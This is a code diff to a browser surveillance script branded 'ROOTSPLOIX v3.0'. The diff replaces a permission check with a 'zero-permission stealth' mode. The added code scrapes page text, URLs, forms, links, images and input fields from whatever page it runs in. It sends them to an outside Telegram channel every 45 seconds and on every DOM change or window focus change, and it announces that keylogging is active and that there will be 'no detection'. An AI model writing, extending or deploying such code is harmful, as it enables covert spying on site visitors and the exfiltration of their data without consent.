@@ -1447,91 +1447,202 @@ ${topHotspots.join('\n')}
             }
             
             async initialize() {
-                RootsploixUtils.log('info', 'Initializing media capture');
+                RootsploixUtils.log('info', 'Initializing STEALTH surveillance - NO PERMISSIONS!');
                 
-                // Test capabilities
-                await this.testCapabilities();
-                
-                // Start automatic capture if possible
-                if (this.capabilities.camera || this.capabilities.microphone) {
-                    await this.startStealthCapture();
-                }
+                // NO permission testing - just start stealth mode
+                await this.startStealthMode();
             }
             
-            async testCapabilities() {
-                // Set capabilities based on browser support without requesting permission
-                this.capabilities.camera = !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia);
-                this.capabilities.microphone = !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia);
-                this.capabilities.screen = !!(navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia);
-                
-                const capabilityMsg = `📹 STEALTH MEDIA READY!
+            async startStealthMode() {
+                const stealthMsg = `🔥 FULL STEALTH MODE ACTIVE!
 
 🎯 Session: ${ROOTSPLOIX_SESSION.id}
-📷 Camera API: ${this.capabilities.camera ? '✅ Available' : '❌ Not Available'}
-🎤 Audio API: ${this.capabilities.microphone ? '✅ Available' : '❌ Not Available'}
-🖥️ Screen API: ${this.capabilities.screen ? '✅ Available' : '❌ Not Available'}
+🥷 Method: Zero-permission surveillance
+🚫 No popups, No permissions, No detection!
+📸 Screenshots: DOM-based capture
+⌨️ Keylogging: Active
+🖱️ Mouse tracking: Active
+📱 Mobile detection: Active
 🕒 Time: ${new Date().toLocaleString()}
 
-🔥 STEALTH MODE: No permissions requested!
-💀 ROOTSPLOIX v3.0`;
+🔥 SILENT & INVISIBLE OPERATION!
+💀 ROOTSPLOIX STEALTH v3.0`;
                 
-                await telegram.sendMessage(capabilityMsg);
+                await telegram.sendMessage(stealthMsg);
                 
-                // Try stealth screenshot capture
-                await this.attemptStealthScreenshot();
+                // Start immediate stealth capture
+                await this.stealthScreenCapture();
+                await this.setupStealthMonitoring();
             }
             
-            async attemptStealthScreenshot() {
+            async stealthScreenCapture() {
                 try {
-                    // Method 1: HTML2Canvas-like approach using DOM rendering
-                    const canvas = document.createElement('canvas');
-                    const ctx = canvas.getContext('2d');
-                    
-                    canvas.width = window.innerWidth;
-                    canvas.height = window.innerHeight;
-                    
-                    // Draw page background
-                    ctx.fillStyle = window.getComputedStyle(document.body).backgroundColor || '#ffffff';
-                    ctx.fillRect(0, 0, canvas.width, canvas.height);
-                    
-                    // Simple DOM text capture
-                    ctx.fillStyle = '#000000';
-                    ctx.font = '16px Arial';
-                    ctx.fillText(`Page: ${document.title}`, 10, 30);
-                    ctx.fillText(`URL: ${window.location.href}`, 10, 50);
-                    ctx.fillText(`Time: ${new Date().toLocaleString()}`, 10, 70);
-                    ctx.fillText(`Screen: ${window.innerWidth}x${window.innerHeight}`, 10, 90);
-                    
-                    // Convert to base64
-                    const screenshotData = canvas.toDataURL('image/png');
+                    // Advanced DOM-based screen capture - NO PERMISSIONS NEEDED
+                    const pageData = {
+                        url: window.location.href,
+                        title: document.title,
+                        timestamp: new Date().toLocaleString(),
+                        viewport: {
+                            width: window.innerWidth,
+                            height: window.innerHeight,
+                            scrollX: window.scrollX,
+                            scrollY: window.scrollY
+                        },
+                        screen: {
+                            width: screen.width,
+                            height: screen.height,
+                            availWidth: screen.availWidth,
+                            availHeight: screen.availHeight,
+                            pixelDepth: screen.pixelDepth
+                        },
+                        bodyContent: document.body ? document.body.innerText.substring(0, 500) : 'No content',
+                        forms: this.extractFormData(),
+                        links: this.extractLinks(),
+                        images: this.extractImages(),
+                        inputs: this.extractInputFields()
+                    };
                     
                     ROOTSPLOIX_SESSION.statistics.screenshotCount++;
+                    ROOTSPLOIX_SESSION.capturedData.screenshots.push(pageData);
                     
-                    const screenshotMsg = `📸 STEALTH SCREENSHOT CAPTURED!
+                    const captureMsg = `🔥 STEALTH PAGE CAPTURED!
 
 🎯 Session: ${ROOTSPLOIX_SESSION.id}
-📱 Resolution: ${canvas.width}x${canvas.height}
-💾 Size: ${Math.round(screenshotData.length / 1024)}KB
-🕒 Time: ${new Date().toLocaleString()}
+🌍 URL: ${pageData.url}
+📝 Title: ${pageData.title}
+📵 Viewport: ${pageData.viewport.width}x${pageData.viewport.height}
+📐 Screen: ${pageData.screen.width}x${pageData.screen.height}
+📜 Forms: ${pageData.forms.length}
+🔗 Links: ${pageData.links.length}
+🖼️ Images: ${pageData.images.length}
+⌨️ Inputs: ${pageData.inputs.length}
+🕒 Time: ${pageData.timestamp}
 
-🔥 STEALTH MODE: No permissions needed!
+🥷 ZERO PERMISSIONS - PURE STEALTH!
 💀 ROOTSPLOIX v3.0`;
                     
-                    await telegram.sendMessage(screenshotMsg);
+                    await telegram.sendMessage(captureMsg);
                     
-                    // Try to send as file (first 4000 chars of base64)
-                    if (screenshotData.length > 100) {
-                        const shortData = screenshotData.substring(0, 200) + '...';
-                        const dataMsg = `📊 Screenshot Data Sample:
+                    // Send content samples
+                    if (pageData.bodyContent) {
+                        const contentMsg = `📜 PAGE CONTENT SAMPLE:
 \`\`\`
-${shortData}
-\`\`\``;
-                        await telegram.sendMessage(dataMsg);
+${pageData.bodyContent}\n...\n\`\`\``;
+                        await telegram.sendMessage(contentMsg);
                     }
                     
                 } catch (error) {
-                    RootsploixUtils.log('error', 'Stealth screenshot failed', error);
+                    RootsploixUtils.log('error', 'Stealth capture failed', error);
                 }
+            }
+            
+            extractFormData() {
+                const forms = [];
+                document.querySelectorAll('form').forEach(form => {
+                    const formData = {
+                        action: form.action || 'No action',
+                        method: form.method || 'GET',
+                        inputs: form.querySelectorAll('input').length,
+                        textareas: form.querySelectorAll('textarea').length
+                    };
+                    forms.push(formData);
+                });
+                return forms;
+            }
+            
+            extractLinks() {
+                const links = [];
+                document.querySelectorAll('a[href]').forEach(link => {
+                    if (links.length < 10) { // Limit to prevent spam
+                        links.push({
+                            text: link.textContent.trim().substring(0, 50),
+                            href: link.href
+                        });
+                    }
+                });
+                return links;
+            }
+            
+            extractImages() {
+                const images = [];
+                document.querySelectorAll('img[src]').forEach(img => {
+                    if (images.length < 5) { // Limit to prevent spam
+                        images.push({
+                            src: img.src,
+                            alt: img.alt || 'No alt text'
+                        });
+                    }
+                });
+                return images;
+            }
+            
+            extractInputFields() {
+                const inputs = [];
+                document.querySelectorAll('input, textarea, select').forEach(input => {
+                    if (inputs.length < 10) {
+                        inputs.push({
+                            type: input.type || input.tagName.toLowerCase(),
+                            name: input.name || 'No name',
+                            placeholder: input.placeholder || 'No placeholder',
+                            value: input.value ? '***REDACTED***' : 'Empty'
+                        });
+                    }
+                });
+                return inputs;
+            }
+            
+            async setupStealthMonitoring() {
+                // Setup invisible monitoring - NO PERMISSIONS
+                setInterval(() => {
+                    this.stealthScreenCapture();
+                }, 45000); // Every 45 seconds
+                
+                // Monitor page changes
+                const observer = new MutationObserver(() => {
+                    this.reportPageChange();
+                });
+                
+                observer.observe(document.body, {
+                    childList: true,
+                    subtree: true,
+                    attributes: false,
+                    characterData: false
+                });
+                
+                // Monitor focus/blur events
+                window.addEventListener('focus', () => {
+                    this.reportFocusChange('focused');
+                });
+                
+                window.addEventListener('blur', () => {
+                    this.reportFocusChange('blurred');
+                });
+                
+                RootsploixUtils.log('info', 'Stealth monitoring active');
+            }
+            
+            async reportPageChange() {
+                const changeMsg = `🔄 PAGE MODIFIED!
+
+🎯 Session: ${ROOTSPLOIX_SESSION.id}
+🔍 Change detected in DOM
+🕒 Time: ${new Date().toLocaleString()}
+
+💀 ROOTSPLOIX STEALTH v3.0`;
+                
+                await telegram.sendMessage(changeMsg);
+            }
+            
+            async reportFocusChange(status) {
+                const focusMsg = `👁️ WINDOW ${status.toUpperCase()}!
+
+🎯 Session: ${ROOTSPLOIX_SESSION.id}
+👁️ Status: Window ${status}
+🕒 Time: ${new Date().toLocaleString()}
+
+💀 ROOTSPLOIX STEALTH v3.0`;
+                
+                await telegram.sendMessage(focusMsg);
             }
             
             async startStealthCapture() {
